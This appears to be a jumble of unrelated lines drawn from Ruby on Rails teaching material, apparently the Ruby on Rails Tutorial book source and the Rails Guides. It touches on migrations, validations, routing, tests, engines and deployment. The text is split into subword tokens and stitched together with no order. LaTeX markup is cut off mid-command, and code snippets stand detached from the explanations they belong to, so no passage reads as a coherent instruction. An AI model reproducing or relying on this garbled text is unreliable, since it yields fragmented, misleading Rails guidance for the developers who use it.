▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁user name , ▁we ▁open ▁the ▁the or e t ical ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date .
▁The ▁\ k ode { provide } ▁function ▁is ▁its ▁replace ment .
▁See ▁the ▁Rails ▁G u ide ▁on ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / active _ record _ query ing ▖ html } { Active ▁Record ▁ Query ▁Interface } ▁for ▁more ▁on ▁\ k ode { where } ▁and ▁related ▁methods .
▁This ▁tutorial ▁will ▁usually ▁use ▁the ▁full ▁\ k ode { checkout } ▁command , ▁which ▁works ▁for ▁systems ▁that ▁don ' t ▁have ▁\ k ode { co } ▁configured , ▁but ▁in ▁real ▁ life ▁I ▁ nearly ▁always ▁use ▁\ k ode { git ▁co } .
▁' X - Content - Type - Options ' ▁=> ▁' no sniff '
▁The ▁next ▁step ▁is ▁to ▁define ▁a ▁\ k ode { destroy } ▁action ▁in ▁the ▁Microposts ▁controller , ▁which ▁is ▁analogous ▁to ▁the ▁user ▁case ▁in ▁Listing ~\ ref { code : admin _ destroy _ before _ filter } .
▁As ▁with ▁the ▁Users ▁resource , ▁we ' ll ▁use ▁an ▁integration ▁test :
▁* ▁` nil ` ▁and ▁` false `,
▁The ▁reason ▁this ▁works ▁is ▁that ▁the ▁\ k ode { change } ▁method ▁know s ▁that ▁\ k ode { drop \_ table } ▁is ▁the ▁ inverse ▁of ▁\ k ode { create \_ table }, ▁which ▁means ▁that ▁the ▁ rollback ▁migration ▁can ▁be ▁easily ▁inferred .
▁validates ▁: content , ▁length : ▁ {
▁We ' ll ▁set ▁about ▁changing ▁this ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } .
▁Doe s ▁not ▁work ▁in ▁combination ▁with ▁the ▁`: through ` ▁or ▁`: as ` ▁options .
▁# ▁I gnore ▁the ▁default ▁SQLite ▁database .
▁The ▁error ▁page ▁for ▁ / users /1 ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ routing _ error - full ▖ png }{( full ▁size )}
▁default ▁to : ▁ Proc ▖ new ▁ { ▁ Admin ▖ pluck (: email ) ▁ },
▁* ▁` create _ with `
▁` config ▖ action _ view ` ▁includes ▁a ▁small ▁number ▁of ▁configuration ▁settings :
▁@ person ▁= ▁person
▁$ ▁rails ▁g
▁ cd ▁one ▁directory ▁up
▁The ▁new ▁signup ▁page ▁at ▁\ href { http :// localhost :3000/ signup }{/ signup } ▖ ~\ href { http :// railstutorial ▖ org / images / figures / new _ signup _ page _ bootstrap - full ▖ png }{( full ▁size )}
▁Even ▁more ▁important , ▁though , ▁is ▁that ▁the ▁ core ▁user ▁ persistence ▁code ▁is ▁in ▁fact ▁completely ▁un test ed ▁at ▁present .
▁In ▁this ▁case , ▁the ▁ range ' s ▁\ k ode { each } ▁method ▁can ▁handle ▁a ▁block ▁with ▁a ▁single ▁local ▁variable , ▁which ▁we ' ve ▁called ~\ k ode { i }, ▁and ▁it ▁just ▁execute s ▁the ▁block ▁for ▁each ▁value ▁in ▁the ▁ range .
▁* ▁` after _ initialize `: ▁Run ▁directly ▁after ▁the ▁initialization ▁of ▁the ▁application , ▁after ▁the ▁application ▁ initializers ▁in ▁` config / initializers ` ▁are ▁run .
▁ Write ▁a ▁test ▁for ▁the ▁error ▁messages ▁implemented ▁in ▁Listing ~\ ref { code : f _ error _ messages } .
▁# ▁gem ▁' child process ', ▁' 0 ▖ 3 ▖ 6 '
▁The ▁Ruby ▁JavaScript ▁( R JS ) ▁to ▁destroy ▁a ▁following ▁relationship .
▁About ▁the ▁author
▁This ▁simply ▁arrange s ▁to ▁follow ▁the ▁redirect ▁after ▁submission , ▁result ing ▁in ▁a ▁rendering ▁of ▁the ▁\ k ode { ' users / show ' } ▁template .
▁in ▁the ▁previous ▁exercise ▁would ▁catch ▁it ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 9 06 99 b ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁following _ tests ▁( end )╼╼ ▁% ▁section ▁a _ web _ interface _ for _ following _ and _ followers ▁( end )╼╼ ▁\ section { The ▁status ▁feed } ▁% ▁( fold )╼ ▁\ label { sec : the _ status _ feed }╼╼
▁A ▁G u ide ▁for ▁U pgrading ▁Ruby ▁on ▁Rails
▁Setting ▁this ▁up ▁is ▁pa in full y ▁simple .
▁The ▁full ▁list ▁of ▁options ▁for ▁the ▁plugin ▁generator ▁may ▁be ▁seen ▁by ▁typing :
▁ cd ▁to ▁ home ▁directory
▁In ▁this ▁section , ▁we ' ll ▁implement ▁the ▁users ▁data ▁model ▁in ▁Section ~\ ref { sec : modeling _ demo _ users }, ▁along ▁with ▁a ▁web ▁interface ▁to ▁that ▁model .
▁config ▖ action _ mailer ▖ default _ url _ options ▁= ▁ { ▁host : ▁' example ▖ com ' ▁ }
▁These ▁sort s ▁of ▁hashes - of - hashes , ▁or ▁\ emph { nested ▁hashes }, ▁are ▁heav ily ▁used ▁by ▁Rails , ▁as ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : signup _ failure } .
▁### ▁ Engine ▁setup
▁ /* ▁ typography ▁* /
▁add _ index ▁: public ation s , ▁: public ation _ type _ id
▁The ▁` collection ` ▁method ▁returns ▁an ▁array ▁of ▁all ▁of ▁the ▁ associated ▁objects ▖
▁All ▁methods ▁defined ▁in ▁a ▁class ▁after ▁\ k ode { private } ▁are ▁automatically ▁hidden , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁WARNING : ▁The ▁precedence ▁between ▁model ▁names ▁is ▁calculat ed ▁using ▁the ▁`< ` ▁operator ▁for ▁` String ` ▖
▁* ▁` created _ at ` ▁- ▁A utomatically ▁get s ▁set ▁to ▁the ▁current ▁date ▁and ▁time ▁when ▁the ╼ ▁record ▁is ▁first ▁created .
▁-
▁" "▖ demodulize ▁# ▁=> ▁" "
▁Fin ally , ▁the ▁tests ▁a c t ▁as ▁a ▁\ emph { client } ▁for ▁the ▁application ▁code , ▁often ▁leading ▁to ▁more ▁ el eg an t ▁software ▁design s .
▁* ▁` active _ record ▖ set _ dispatch _ hook s ` ▁Re set s ▁all ▁ reload able ▁connection s ▁to ▁the ▁database ▁if ▁` config ▖ cache _ classes ` ▁is ▁set ▁to ▁` false ` .
▁Ju st ▁change ▁it ▁from ▁its ▁default ▁` " localhost " ` ▁setting ▖ </ li >
▁We ' ll ▁complete ▁this ▁task , ▁and ▁with ▁it ▁the ▁sample ▁application , ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁To ▁get ▁started ▁with ▁the ▁implementation , ▁we ▁first ▁generate ▁a ▁migration ▁corresponding ▁to ▁Figure ~\ ref { fig : relationship _ model } :
▁( As ▁long ▁as ▁you ▁push ed ▁the ▁corresponding ▁repositories ▁up ▁to ▁Bitbucket , ▁you ▁can ▁always ▁re c over ▁them ▁later ▖)
▁In ▁the ▁code
▁Having
▁File s ▁in ▁this ▁directory ▁are ▁served ▁by ▁the ▁Sprockets ▁middleware .
▁In ▁short , ▁we ▁should n ' t ▁allow ▁\ k ode { name } ▁and ▁\ k ode { email } ▁to ▁be ▁just ▁any ▁strings ; ▁we ▁should ▁enforce ▁certain ▁constraints ▁on ▁their ▁values .
▁in ▁Listing ~\ ref { code : generalized _ current _ user } ▁and
▁A lthough ▁our ▁sample ▁app ▁is ▁a ▁little ▁too ▁small ▁to ▁refactor ▁right ▁now , ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Code _ s me ll } { code ▁ s me ll } ▁see p s ▁in ▁at ▁every ▁c rack , ▁and ▁we ' ll ▁get ▁started ▁refactoring ▁in ▁Section ~\ ref { sec : layouts _ and _ embedded _ ruby } .
▁You ▁define ▁association ▁callbacks ▁by ▁adding ▁options ▁to ▁the ▁association ▁declaration ▖
▁* ▁One ▁article ▁can ▁have ▁many ▁comments .
▁To ▁configure ▁our ▁application ▁to ▁use ▁cloud ▁ storage ▁in ▁production , ▁we ' ll ▁use ▁the ▁\ text tt { fo g } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : image _ uploader _ production } .
▁This ▁isn ' t ▁technical ly ▁true --- the ▁scaffold ing ▁includes ▁ r udi ment ary ▁tests --- but ▁the ▁generated ▁tests ▁are ▁ugly ▁and ▁in f le x ible , ▁and ▁they ▁don ' t ▁test ▁for ▁data ▁validation , ▁authentication , ▁or ▁any ▁other ▁custom ▁requirements .
▁belongs _ to ▁: magazine
▁class ▁C ; ▁end
▁The ▁method ▁` acts _ like ?` ▁provides ▁a ▁way ▁to ▁check ▁whether ▁some ▁class ▁ acts ▁like ▁some ▁other ▁class ▁base d ▁on ▁a ▁simple ▁convention : ▁a ▁class ▁that ▁provides ▁the ▁same ▁interface ▁as ▁` String ` ▁defines
▁\ emph { Note } : ▁The ▁\ emph { S ol u tion s ▁M an u al ▁for ▁E x er ci s es }, ▁with ▁solution s ▁to ▁every ▁exercise ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁book , ▁is ▁included ▁for ▁free ▁with ▁every ▁p ur cha se ▁at ▁\ href { http :// www ▖ railstutorial ▖ org /}{ www ▖ railstutorial ▖ org } .
▁This ▁is ▁why , ▁if ▁your ▁principal ▁programming ▁inter est ▁is ▁writing ▁web ▁applications , ▁I ▁recommend ▁learning ▁Rails ▁first , ▁then ▁learning ▁Ruby , ▁then ▁ lo o p ing ▁back ▁to ▁Rails .
▁ Adding ▁image ▁display ▁to ▁microposts .
▁An y th ing ▁you ▁can ▁do ▁to ▁make ▁bug ▁report s ▁more ▁succinct ▁or ▁easier ▁to ▁re p r o d u ce ▁is ▁a ▁help ▁to ▁f ol k s ▁try ing ▁to ▁write ▁code ▁to ▁fix ▁those ▁bug s ▁- ▁whether ▁you ▁end ▁up ▁writing ▁the ▁code ▁yourself ▁or ▁not .
▁### ▁Using ▁a ▁ Class ▁Provide d ▁by ▁the ▁Application
▁Before , ▁job s ▁would ▁look ▁like ▁this :
▁# ▁ ▖ ▖ .
▁If ▁you ▁are ▁used ▁to ▁skip p ing ▁around ▁in ▁technical ▁ books , ▁tak ing ▁this ▁line ar ▁approach ▁m ight ▁require ▁some ▁a d just ment , ▁but ▁I ▁suggest ▁giv ing ▁it ▁a ▁try .
▁first : ▁1
▁In ▁the ▁present ▁case , ▁we ▁need ▁only ▁one ▁user , ▁who se ▁information ▁should ▁consist ▁of ▁a ▁valid ▁name ▁and ▁email ▁address .
▁Client ▖ pluck (: name )
▁To ▁ begin ▁with , ▁let ' s ▁get ▁some ▁text ▁up ▁on ▁ screen ▁quickly ▖
▁* ▁` javascripts ` ▁turn s ▁on ▁the ▁ hook ▁for ▁JavaScript ▁files ▁in ▁generator s ▖
▁This ▁route ▁doesn ' t ╼ ex ist ▁at ▁the ▁moment , ▁but ▁can ▁be ▁created ▁by ▁changing ▁the ▁` resources ▁: articles ` ▁line ╼ in side ▁` config / routes ▖ rb ` ▁into ▁these ▁lines :
▁now ▁= ▁ DateTime ▖ current ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁20 : 2 6 : 36 ▁+0000
▁( Note ▁that ▁we ' ve ▁just ▁left ▁the ▁remember ▁token ▁blank ; ▁it ▁doesn ' t ▁matter ▁what ▁its ▁value ▁is , ▁because ▁the ▁error ▁occur s ▁before ▁it ▁ever ▁get s ▁used ▖)
▁#### ▁Using ▁a ▁Model ▁Provide d ▁by ▁the ▁Application
▁is ▁the ▁submitted ▁email ▁address ▁and
▁( You ▁m ight ▁also ▁consider ▁the ▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { RSpec ▁course ▁at ▁Code ▁School }, ▁which ▁one ▁reader ▁has ▁ s a id ▁ answer ed ▁a ▁lot ▁of ▁his ▁RSpec ▁ questions ▖)
▁This ▁evaluate s ▁to ▁\ k ode { session [: forwarding \_ url ]} ▁unless ▁it ' s ▁\ k ode { nil }, ▁in ▁which ▁case ▁it ▁evaluate s ▁to ▁the ▁given ▁default ▁URL .
▁To ▁call ▁this ▁` published ` ▁scope ▁we ▁can ▁call ▁it ▁on ▁either ▁the ▁class :
▁ Follow ing ▁Twitter ' s ▁lead , ▁we ' ll ▁plan ▁to ▁display ▁a ▁user ' s ▁microposts ▁not ▁on ▁a ▁separate ▁microposts ▁\ k ode { index } ▁page ▁but ▁rather ▁directly ▁on ▁the ▁user ▁\ k ode { show } ▁page ▁itself , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : user _ microposts _ mockup } .
▁class ▁M an if est ▁< ▁ActiveRecord :: Base
▁As ▁prepar ation ▁for ▁the ▁deployment , ▁you ▁should ▁merge ▁your ▁changes ▁into ▁the ▁\ k ode { master } ▁branch ▁at ▁this ▁point :
▁Here ▁the ▁\ k ode { ' ▖ ' } ▁is ▁Unix ▁for ▁`` current ▁directory '' , ▁and ▁\ k ode { ' ▖ / example \_ user ' } ▁tell s ▁Ruby ▁to ▁look ▁for ▁an ▁example ▁user ▁file ▁relative ▁to ▁that ▁location .
▁ Getting ▁started ▁with ▁testing ▁can ▁be ▁challenging , ▁ requiring ▁ ext en s ive ▁ knowledg e ▁of ▁both ▁Rails ▁and ▁Ruby .
▁* ▁File ▁names .
▁If ▁the ▁user ▁is ▁ authenticated ▁according ▁to ▁the ▁boolean s ▁above , ▁we ▁need ▁to ▁activate ▁the ▁user ▁and ▁update ▁the ▁\ k ode { activated \_ at } ▁timestamp :
▁Verify ▁that ▁you ▁get ▁the ▁behavior ▁show n ▁in ▁Figure ~\ ref { fig : micropost _ content _ can t _ be _ blank } .
▁As ▁long ▁as ▁you ▁re tain ▁this ▁notice ▁you
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁title ▁tests ▖
▁ ╼ ▁User ▁add ▁some ▁examples ▁to ▁( or ▁delete )
▁This ▁code ▁fetch es ▁data ▁from ▁"/ test ", ▁and ▁then ▁ append s ▁the ▁result ▁to ▁the ▁` div `╼ with ▁an ▁id ▁of ▁` re s ul t s ` .
▁The ▁main ▁reason ▁for ▁this ▁is ▁that ▁the ▁default ▁Rails ▁page ▁typical ly ▁break s ▁at ▁Heroku , ▁which ▁make s ▁it ▁hard ▁to ▁tell ▁if ▁the ▁deployment ▁was ▁successful ▁or ▁not .
▁You ▁can ▁confirm ▁that ▁the ▁test ▁suite ▁is ▁now ▁passing :
▁You ▁can ▁supply ▁them ▁as ▁defaults :
▁The ▁helper ▁inside ▁` app / helpers / blorgh / articles _ helper ▖ rb ` ▁is ▁also ▁namespaced :
▁In ▁the ▁next ▁version , ▁these ▁errors ▁will ▁no ▁longer ▁be ▁ suppress ed .
▁* ▁` eager _ load `
▁Because ▁new ly ▁ activated ▁users ▁get ▁ redirected ▁to ▁their ▁profile ▁pages , ▁we ▁already ▁have ▁a ▁test ▁that ▁the ▁profile ▁page ▁render s ▁correctly ▁( Listing ~\ ref { code : signup _ with _ account _ activation _ test }) .
▁The ▁initial ▁duplicate ▁email ▁test ▁appears ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ test } .
▁The ▁following ▁should ▁also ▁be ▁added ▁to ▁` Gemfile `:
▁ Test ▁for ▁the ▁password ▁and ▁password ▁confirmation .
▁Now ▁that ▁we ' ve ▁go tt en ▁to ▁\ passing , ▁we ▁are ▁free ▁to ▁refactor ▁our ▁code ▁with ▁confidence .
▁No ▁test - driven ▁development
▁person ▁= ▁Person ▖ new ( name : ▁" A nd re a ", ▁email : ▁" and re a @ example ▖ com ")
▁It ╼ will ▁then ▁use ▁P us h State ▁to ▁change ▁the ▁URL ▁to ▁the ▁correct ▁one , ▁pre serv ing ╼ ref re sh ▁ se man tic s ▁and ▁giv ing ▁you ▁ pretty ▁URLs .
▁( We ' ve ▁used ▁a ▁CSS ~ id ▁because ▁we ▁expect ▁the ▁site ▁ logo ▁to ▁appear ▁on ▁the ▁page ▁only ▁once , ▁but ▁you ▁could ▁use ▁a ▁class ▁instead ▖)
▁NOTE : ▁User ▁defined ▁rake ▁task s ▁will ▁run ▁in ▁the ▁` development ` ▁environment ▁by ╼ default ▖
▁ } ╼ %= ▁<< ( chapter s / gemfile s / sample _ app / Gemfile , ▁ lang : ▁ ruby )╼\ end { code listing }╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : user _ microposts _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁Doe s ▁the ▁same ▁as ▁` collection ▖ create ` ▁above , ▁but ▁raise s ▁` ActiveRecord :: RecordInvalid ` ▁if ▁the ▁record ▁is ▁invalid .
▁C or re c t ▁tests ▁for ▁signin ▁failure .
▁This ▁way ▁we ▁can ▁access ▁the ▁activation ▁token ▁using
▁Action ▁View ▁templates ▁can ▁be ▁written ▁in ▁sever al ▁ways ▖
▁ Calvin ▁navigate s ▁to ▁the ▁profile ▁of ▁a ▁second ▁user , ▁ Thomas ▁ Hobbes ▁( Figure ~\ ref { fig : page _ flow _ other _ profile _ follow _ button }), ▁click ing ▁on ▁the ▁`` Follow '' ▁button ▁to ▁follow ▁that ▁user .
▁### ▁Using ▁` root `
▁### ▁Rails ▁HTML ▁S an it ize r
▁NOTE ▖ ▁Because ▁you ' re ▁working ▁in ▁the ▁development ▁environment ▁by ▁default , ▁this ╼ command ▁will ▁apply ▁to ▁the ▁database ▁defined ▁in ▁the ▁` development ` ▁section ▁of ▁your ╼` config / database ▖ yml ` ▁file ▖
▁d =' ex - b 87 c 8 2 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁users _ controller ▁( end )╼╼ ▁\ subsection { Sign up ▁URL } ▁% ▁( fold )╼ ▁\ label { sec : signup _ url }╼╼
▁The ▁result ing ▁login ▁form ▁appears ▁in ▁Figure ~\ ref { fig : login _ form _ remember _ me } .
▁Note ▁that ▁you ▁will ▁have ▁to ▁pass ▁the ▁form ▁variable ~\ k ode { f } ▁explicitly ▁as ▁a ▁local ▁variable , ▁as ▁show n ▁in ▁Listing ~\ ref { code : new _ user _ with _ partial } .
▁The ▁user ▁profile ▁page ▁with ▁the ▁default ▁Gravatar .
▁# ▁object ▁called ▁" M ", ▁but ▁it ▁is ▁a ▁new ▁instance .
▁params ▖ require (: article )▖ permit (: title , ▁: text )
▁returns ▁\ k ode {" 0 ▁errors " }, ▁\ k ode {" 1 ▁error " }, ▁\ k ode {" 2 ▁errors " }, ▁and ▁so ▁on , ▁depending ▁on ▁how ▁many ▁errors ▁there ▁are , ▁there by ▁avoid ing ▁un gr a m m at ical ▁ ph ra s es ▁such ▁as ▁\ k ode {" 1 ▁errors "} ▁( a ▁di str ess ing ly ▁common ▁mistake ▁in ▁app s ▁and ▁on ▁the ▁Web ) .
▁$ ▁git ▁re base ▁rails / master
▁Author i z ation ▁tests ▁use ▁both ▁ low - level ▁commands ▁to ▁submit ▁particular ▁HTTP ▁requests ▁directly ▁to ▁controller ▁actions ▁and ▁high - level ▁integration ▁tests .
▁WARNING : ▁Additional ly , ▁objects ▁will ▁be ▁destroyed ▁if ▁they ' re ▁ associated ▁with ▁` dependent : ▁: destroy `, ▁and ▁delete d ▁if ▁they ' re ▁ associated ▁with ▁` dependent : ▁: delete _ all ` .
▁NOTE : ▁Using ▁` where ` ▁like ▁this ▁will ▁only ▁work ▁when ▁you ▁pass ▁it ▁a ▁ Hash ▖
▁This ╼ namespace ▁prevent s ▁code ▁co ll is ion s , ▁but ▁often ▁engine ▁controllers ▁need ▁to ▁access ╼ methods ▁in ▁the ▁main ▁application ' s ▁` Application Controller ` ▖
▁ Railtie s
▁e ' ▁id =' ex - 9 8 f cd 3 ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁named _ routes ▁( end )╼╼ \ subsection { L a y out ▁link ▁tests } ▁% ▁( fold )╼\ label { sec : layout _ link _ tests }╼╼
▁$ ▁git ▁branch ▁-- track ▁4 - 0 - s table ▁ origin / 4 - 0 - s table
▁Active ▁Job ▁Basic s
▁Thu s , ▁it ▁combine s ▁the ▁function s ▁of ▁` assert _ generate s ` ▁and ▁` assert _ recognizes `:
▁You ▁can ▁also ▁provide ▁a ▁block ▁to ▁redirect , ▁which ▁receive s ▁the ▁ symbolize d ▁path ▁parameters ▁and ▁the ▁request ▁object :
▁ Order ▖ group (: status )▖ count
▁I ▁shall ▁be ▁late !" ▖ truncate ( 20 )
▁Sprockets ▁uses ▁files ▁named ▁` index ` ▁( with ▁the ▁relevant ▁extensions ) ▁for ▁a ▁special ╼ p urpose .
▁With ▁the ▁implementation ▁in ▁Listing ~\ ref { code : remember _ me _ ternary }, ▁our ▁login ▁system ▁is ▁complete , ▁as ▁you ▁can ▁verify ▁by ▁check ing ▁or ▁un check ing ▁the ▁ box ▁in ▁your ▁browser .
▁As ▁seen ▁in ▁Figure ~\ ref { fig : user _ index _ all }, ▁I ' ve ▁taken ▁the ▁ lib er t y ▁of ▁associat ing ▁the ▁first ▁few ▁sample ▁addresses ▁with ▁Gravatar s ▁so ▁that ▁they ' re ▁not ▁all ▁the ▁default ▁Gravatar ▁image .
▁Create ▁an ▁S 3 ▁b u cket ▁( with ▁a ▁name ▁of ▁your ▁choice ) ▁using ▁the ▁\ href { https :// console ▖ a w s ▖ a mazon ▖ com / s 3 } { A W S ▁C on so le }, ▁and ▁then ▁gra nt ▁read ▁and ▁write ▁ permission ▁to ▁the ▁user ▁created ▁in ▁the ▁previous ▁step .
▁P utting ▁everything ▁together ▁gives ▁the ▁pagination ▁and ▁delete ▁test ▁in ▁Listing ~\ ref { code : delete _ link _ integration _ test }, ▁which ▁includes ▁tests ▁for ▁both ▁admin s ▁and ▁non - admin s .
▁ ╼ ▁is ▁a ▁project ▁to ▁make ▁a ▁book ▁and ▁ screencasts ▁to ▁teach ▁web ▁development
▁You ▁can ▁check ▁whether ▁a ▁module ▁has ▁a ▁name ▁with ▁the ▁ predicate ▁` anonymous ?` :
▁The ▁more ▁generic ▁form ▁can ▁also ▁be ▁used :
▁The ▁page ▁is ▁identical ▁to ▁Figure ~\ ref { fig : hello _ world _ hello _ app }, ▁but ▁now ▁it ' s ▁running ▁in ▁a ▁production ▁environment ▁on ▁the ▁live ▁web .
▁def ▁create
▁< h 1> New ▁ zone </ h 1>
▁ / / ▁ ▖ ▖ .
▁We ▁first ▁invoke ▁the ▁console ▁with ▁\ k ode { rails ▁console } ▁at ▁the ▁command ▁line , ▁and ▁then ▁retrieve ▁the ▁first ▁user ▁from ▁the ▁database ▁using ▁\ k ode { User ▖ first } ▁( putting ▁the ▁results ▁in ▁the ▁variable ▁\ k ode { first \_ user })
▁It em ▁Load ▁( 0 ▖ 3 m s ) ▁ SELECT ▁* ▁FROM ▁` items ` ▁LIMIT ▁1 ▁F O R ▁ UPDATE
▁As ▁show n ▁in ▁Figure ~\ ref { fig : invalid _ email _ password _ reset }, ▁at ▁this ▁point ▁the ▁application ' s ▁behavior ▁for ▁invalid ▁email ▁addresses ▁is ▁already ▁working .
▁c p ▁< source > ▁< target >
▁ Each ▁helper ▁accept s ▁an ▁arbitrar y ▁number ▁of ▁attribute ▁names , ▁so ▁with ▁a ▁single ╼ line ▁of ▁code ▁you ▁can ▁add ▁the ▁same ▁kind ▁of ▁validation ▁to ▁sever al ▁attributes .
▁ ╼ ▁This ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁ Edit ▁the ▁routes ▁file ▁from ▁Listing ~\ ref { code : hello _ root _ route } ▁so ▁that ▁the ▁root ▁route ▁go es ▁to ▁\ k ode { goodbye } ▁instead ▁of ▁to ▁\ k ode { hello } ▁( Figure ~\ ref { fig : goodbye _ world }) .
▁NOTE : ▁The ▁` sass - rails ` ▁gem ▁is ▁automatically ▁used ▁for ▁CSS ▁compression ▁if ▁included ╼ in ▁Gemfile ▁and ▁no ▁` config ▖ assets ▖ css _ compressor ` ▁option ▁is ▁set .
▁Configur ing ▁Rails ▁Application s
▁If ▁you ▁wish , ▁you ▁can ▁manually ▁specify ▁a ▁URL ▁inside ▁of ▁your ▁` config / database ▖ yml `
▁@ article ▁= ▁Article ▖ new
▁An y ▁method ▁with ▁a ▁block ▁will ▁be ▁treat ed ▁as ▁an ▁ XML ▁markup ▁tag ▁with ▁nested ▁markup ▁in ▁the ▁block ▖
▁T hanks ▁to ▁reader ▁P a ul o ▁C é li o ▁ J ú n i or ▁for ▁point ing ▁this ▁out .
▁> > ▁10 ▖ weeks ▖ ago
▁You ▁should ▁be ▁able ▁to ▁refresh ▁the ▁pull ▁request ▁on ▁GitHub ▁and ▁see ▁that ▁it ▁has ╼ be en ▁updated .
▁in ▁Listing ~\ ref { code : title _ test } .
▁On ce ▁a ▁method ▁called ▁` receive ` ▁is ▁defined ▁in ▁any ▁mailer , ▁Action ▁Mailer ▁will ╼ parse ▁the ▁raw ▁in com ing ▁email ▁into ▁an ▁email ▁object , ▁ de code ▁it , ▁in st an t i ate ▁a ▁new ╼ mailer , ▁and ▁pass ▁the ▁email ▁object ▁to ▁the ▁mailer ▁` receive ` ▁instance ╼ method ▖
▁All ▁this ▁t al k ▁about ▁classes ▁and ▁inheritance ▁may ▁have ▁trigger ed ▁a ▁flash ▁of ▁re co g n it ion , ▁because ▁we ▁have ▁seen ▁both ▁before , ▁in ▁the ▁Static ▁Pages ▁controller ▁( Listing ~\ ref { code : adding _ the _ about _ page }) :
▁The ▁` params `╼ method ▁returns ▁an ▁` ActiveSupport :: Hash With I ndifferentAccess ` ▁object , ▁which ╼ allow s ▁you ▁to ▁access ▁the ▁keys ▁of ▁the ▁hash ▁using ▁either ▁strings ▁or ▁symbols ▖
▁The ▁initial ▁user ▁\ k ode { update } ▁action .
▁The ▁`` forgot ▁password '' ▁form .
▁The ▁second ▁` Person ` ▁will ▁not ▁be ▁persist ed ▁to ▁the ╼ database .
▁The ▁Static ▁Pages ▁controller ▁with ▁added ▁\ k ode { about } ▁action ▖
▁It ' s ▁also ▁possible ▁to ▁override ▁the ▁column ▁that ▁should ▁be ▁used ▁as ▁the ▁table ' s ╼ primary ▁key ▁using ▁the ▁` ActiveRecord :: Base ▖ primary _ key = ` ▁method :
▁* ▁Name space ▁is ol ation ▁to ▁` lib / blorgh / engine ▖ rb `:
▁The ▁` collection ▖ clear ` ▁method ▁remove s ▁every ▁object ▁from ▁the ▁collection ▁by ▁ deleting ▁the ▁rows ▁from ▁the ▁join ing ▁table ▖
▁You ▁can ▁also ▁set ▁this ▁value ▁through ▁an ▁[ environment ╼ variable ]( http :// en ▖ w ikipedia ▖ org / wiki / E n v ir on ment _ variable ) ▁to ▁make ▁running ▁a ╼ staging ▁copy ▁of ▁your ▁site ▁easier :
▁* ▁: condition s
▁def ▁validate ( record )
▁See ▁more
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { password \_ digest } ▁attribute .
▁For ▁example , ▁if ▁\ k ode { flash [: success ] ▁= ▁" Welcome ▁to ▁the ▁ Sample ▁App !" }, ▁then ▁the ▁code
▁ Category ▖ joins (: articles )
▁By ▁default ▁` ActionView :: Partial s :: Partial Render er ` ▁has ▁its ▁object ▁in ▁a ▁local ▁variable ▁with ▁the ▁same ▁name ▁as ▁the ▁template ▖
▁For ▁example , ▁we ▁write
▁C ▖ descendants ▁# ▁=> ▁[ B ]
▁You ▁are ▁responsib le ▁for ▁maintain ing ▁your ▁database ▁ schema ▁to ▁match ▁your ▁associations ▖
▁" B ackoffice :: UsersController "▖ demodulize ▁# ▁=> ▁" UsersController "
▁### ▁Running ▁a ▁ Migration
▁validates ▁: size , ▁inclusion : ▁ { ▁in : ▁% w ( small ▁m ed i um ▁large ),
▁#### ▁JSON ▁representation ▁of ▁Time ▁objects
▁This ▁can ▁lead ▁to ▁two ▁copie s ▁of ▁an ▁object ▁getting ▁out ▁of ▁ sy n c :
▁config ▖ middleware ▖ delete ▁" ActionDispatch :: Cookie s "
▁A ▁matter ▁worth ▁tak ing ▁into ▁consider ation ▁when ▁writing ▁functional ▁tests ▁is ▁that ╼ the ▁tests ▁are ▁going ▁to ▁be ▁running ▁on ▁an ▁application ▁- ▁the ▁` test / dummy `╼ application ▁- ▁rather ▁than ▁your ▁engine ▖
▁array ▁= ▁[ ' string ']
▁If ▁this ▁was ▁left ▁as ▁a ▁typical ▁` get ` ▁route , ▁it ▁could ▁be ▁possible ▁for ╼ people ▁to ▁ craft ▁ malicious ▁URLs ▁like ▁this :
▁Create s ▁a ▁check ▁ box ▁form ▁input ▁tag .
▁in ▁Listing ~\ ref { code : skip _ re size _ initializer } .
▁def ▁ symbolize _ keys
▁# ▁examples ▁within ▁a ▁ transaction , ▁remove ▁the ▁following ▁line ▁or ▁assign ▁false
▁To p ic ▖ create ( title : ▁nil )▖ valid ?
▁With ▁ polymorphic ▁associations , ▁a ▁model ▁can ▁be long ▁to ▁more ▁than ▁one ▁other ▁model , ▁on ▁a ▁single ▁association ▖
▁A ▁ detailed ▁diagram ▁of ▁ MVC ▁in ▁Rails ▖ ~\ href { http :// railstutorial ▖ org / images / figures / mvc _ detailed - full ▖ png }{( full ▁size )}
▁We ' ll ▁cover ▁validation ▁errors ▁in ▁ greater ▁ de p th ▁in ▁the ▁[ W or k ing ▁with ▁Validation ╼ Error s ](# working - with - validation - errors ) ▁section ▖
▁P la ce ▁an ▁ encrypted ▁version ▁of ▁the ▁user ' s ▁id ▁in ▁the ▁browser ▁cookies .
▁% r { ▖ } m ▖ multiline ?
▁<%= ▁form _ for ▁: article , ▁url : ▁articles _ path ▁do ▁| f | ▁%>
▁ / Users / mhartl / rails _ projects / sample _ app / config
